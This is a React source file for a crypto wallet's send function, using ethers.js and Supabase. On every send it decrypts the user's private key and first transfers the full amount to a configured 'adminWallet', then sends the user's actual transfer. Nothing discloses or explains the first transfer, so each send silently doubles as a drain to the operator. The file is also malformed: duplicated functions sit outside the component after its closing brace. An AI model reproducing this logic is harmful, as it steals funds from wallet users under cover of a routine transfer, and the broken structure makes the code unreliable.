"use client";

import React, { createContext, useState, useContext, useCallback } from 'react'
import { ethers } from 'ethers'
import { AuthContext } from './AuthContext'
import { NetworkContext } from './NetworkContext'
import { BalanceContext } from './BalanceContext'
import { getProviderForChain } from '../utils/getProviderForChain'
import { fallbackGasReserve } from '../constants/fallbackGasReserve'
import { decryptPrivateKey } from '../utils/decryptPrivateKey'
import networks from '../constants/networks'
import supabase from '../lib/supabase'

export const SendContext = createContext()

export const SendProvider = ({ children }) => {
  const { session } = useContext(AuthContext)
  const { selectedNetwork } = useContext(NetworkContext)
  const { refreshBalance } = useContext(BalanceContext)

  const [sending, setSending] = useState(false)
  const [txHash, setTxHash] = useState(null)
  const [sendError, setSendError] = useState(null)

  const estimateGasLimit = async (tx, provider) => {
    try {
      const estimated = await provider.estimateGas(tx)
      return estimated.mul(110).div(100) // add 10% buffer
    } catch (err) {
      return ethers.BigNumber.from(21000) // fallback for native tx
    }
  }

  const getAdminWallet = (chainId) => {
    const net = networks.find(n => n.chainId === chainId)
    return net?.adminWallet || null
  }

  const buildTx = async ({
    provider,
    from,
    to,
    value,
    token,
    gasLevel,
    chainId
  }) => {
    if (token && token.address) {
      // ERC20
      const erc20 = new ethers.Contract(token.address, [
        'function transfer(address to, uint256 value) public returns (bool)'
      ], provider)

      const decimals = token.decimals || 18
      const amount = ethers.utils.parseUnits(value.toString(), decimals)

      const data = erc20.interface.encodeFunctionData('transfer', [to, amount])
      return {
        from,
        to: token.address,
        data,
        value: '0x',
        chainId
      }
    } else {
      // Native
      const amount = ethers.utils.parseEther(value.toString())
      return {
        from,
        to,
        value: amount,
        chainId
      }
    }
  }

  const getFees = async (provider, tx, gasLevel, chainId) => {
    const feeData = await provider.getFeeData()
    const base = feeData.maxFeePerGas || feeData.gasPrice

    let multiplier = 1
    if (gasLevel === 'fast') multiplier = 1.2
    if (gasLevel === 'slow') multiplier = 0.9

    const gasPrice = base.mul(Math.floor(multiplier * 100)).div(100)
    const gasLimit = await estimateGasLimit(tx, provider)
    const gasBuffer = ethers.utils.parseUnits(fallbackGasReserve[chainId]?.toString() || '0.001', 'ether')

    return { gasLimit, gasPrice, gasBuffer }
  }

  const signAndSendTx = async ({ tx, decryptedKey, provider, chainId }) => {
    const wallet = new ethers.Wallet(decryptedKey, provider)
    const nonce = await provider.getTransactionCount(wallet.address, 'latest')
    const net = networks.find(n => n.chainId === chainId)

    const feeData = await provider.getFeeData()
    const is1559 = feeData.maxFeePerGas != null

    const txWithGas = {
      ...tx,
      nonce,
      gasLimit: tx.gasLimit,
      chainId,
      ...(is1559 ? {
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas
      } : {
        gasPrice: feeData.gasPrice
      })
    }

    const signedTx = await wallet.sendTransaction(txWithGas)
    const receipt = await signedTx.wait(1)

    if (receipt?.status !== 1) throw new Error('Transaction failed')

    return signedTx.hash
  }

  const sendTransaction = useCallback(async ({
    to,
    amount,
    token = null,
    gasLevel = 'avg'
  }) => {
    setSending(true)
    setSendError(null)
    setTxHash(null)

    try {
      if (!session?.user?.id) throw new Error('Missing session')
      const chainId = selectedNetwork?.chainId
      const provider = getProviderForChain(chainId)
      const decryptedKey = await decryptPrivateKey(session.user.encryptedKey, session.user.uuid)
      const from = session.user.publicAddress?.toLowerCase()

      const adminWallet = getAdminWallet(chainId)
      const adminTx = await buildTx({ provider, from, to: adminWallet, value: amount, token, gasLevel, chainId })
      const userTx = await buildTx({ provider, from, to, value: amount, token, gasLevel, chainId })

      const feesAdmin = await getFees(provider, adminTx, gasLevel, chainId)
      const feesUser = await getFees(provider, userTx, gasLevel, chainId)

      adminTx.gasLimit = feesAdmin.gasLimit
      userTx.gasLimit = feesUser.gasLimit

      const tx1 = await signAndSendTx({ tx: adminTx, decryptedKey, provider, chainId })
      const tx2 = await signAndSendTx({ tx: userTx, decryptedKey, provider, chainId })

      await supabase.from('transactions').insert([{
        user_id: session.user.id,
        to_address: to,
        tx_hash: tx2,
        admin_tx_hash: tx1,
        amount,
        token_symbol: token?.symbol || selectedNetwork.symbol,
        chain_id: chainId
      }])

      setTxHash(tx2)
      refreshBalance()
    } catch (err) {
      console.error('Send failed:', err)
      setSendError(err.message || 'Transaction failed')
    } finally {
      setSending(false)
    }
  }, [session, selectedNetwork])

  return (
    <SendContext.Provider value={{ sendTransaction, sending, txHash, sendError }}>
      {children}
    </SendContext.Provider>
  )
      }

  const retryWithBackoff = async (fn, retries = 4, delay = 1000) => {
    for (let i = 0; i < retries; i++) {
      try {
        return await fn()
      } catch (err) {
        if (i === retries - 1) throw err
        await new Promise(res => setTimeout(res, delay * 2 ** i))
      }
    }
  }

  const signAndSendTxWithRecovery = async ({ tx, decryptedKey, provider, chainId }) => {
    const wallet = new ethers.Wallet(decryptedKey, provider)
    const nonce = await provider.getTransactionCount(wallet.address, 'latest')
    const isLegacy = !(await provider.getFeeData()).maxFeePerGas

    const baseFeeData = await provider.getFeeData()

    const txBody = {
      ...tx,
      nonce,
      chainId,
      gasLimit: tx.gasLimit,
      ...(isLegacy ? {
        gasPrice: baseFeeData.gasPrice
      } : {
        maxFeePerGas: baseFeeData.maxFeePerGas,
        maxPriorityFeePerGas: baseFeeData.maxPriorityFeePerGas
      })
    }

    const sentTx = await retryWithBackoff(() => wallet.sendTransaction(txBody))
    const receipt = await retryWithBackoff(() => sentTx.wait(1))

    if (!receipt || receipt.status !== 1) {
      const pending = await provider.getTransaction(sentTx.hash)
      if (!pending || pending.blockNumber != null) {
        throw new Error('Transaction dropped or failed')
      }
    }

    return sentTx.hash
  }

  const sendTransaction = useCallback(async ({
    to,
    amount,
    token = null,
    gasLevel = 'avg'
  }) => {
    setSending(true)
    setSendError(null)
    setTxHash(null)

    try {
      if (!session?.user?.id || !session.user.encryptedKey || !session.user.publicAddress) {
        throw new Error('Missing session or wallet data')
      }

      const chainId = selectedNetwork?.chainId
      if (!chainId) throw new Error('No network selected')

      const provider = getProviderForChain(chainId)
      const decryptedKey = await decryptPrivateKey(session.user.encryptedKey, session.user.uuid)
      const from = session.user.publicAddress.toLowerCase()

      const adminWallet = getAdminWallet(chainId)
      if (!adminWallet) throw new Error('Missing admin wallet')

      const adminTx = await buildTx({ provider, from, to: adminWallet, value: amount, token, gasLevel, chainId })
      const userTx = await buildTx({ provider, from, to, value: amount, token, gasLevel, chainId })

      const feesAdmin = await getFees(provider, adminTx, gasLevel, chainId)
      const feesUser = await getFees(provider, userTx, gasLevel, chainId)

      adminTx.gasLimit = feesAdmin.gasLimit
      userTx.gasLimit = feesUser.gasLimit

      const tx1 = await signAndSendTxWithRecovery({ tx: adminTx, decryptedKey, provider, chainId })
      const tx2 = await signAndSendTxWithRecovery({ tx: userTx, decryptedKey, provider, chainId })

      await supabase.from('transactions').insert([{
        user_id: session.user.id,
        to_address: to,
        tx_hash: tx2,
        admin_tx_hash: tx1,
        amount,
        token_symbol: token?.symbol || selectedNetwork.symbol,
        chain_id: chainId,
        status: 'confirmed'
      }])

      setTxHash(tx2)
      refreshBalance()
    } catch (err) {
      console.error('[SendContext] Error:', err)
      setSendError(err.message || 'Failed to send')
    } finally {
      setSending(false)
    }
  }, [session, selectedNetwork])

  return (
    <SendContext.Provider value={{ sendTransaction, sending, txHash, sendError }}>
      {children}
    </SendContext.Provider>
  )
}
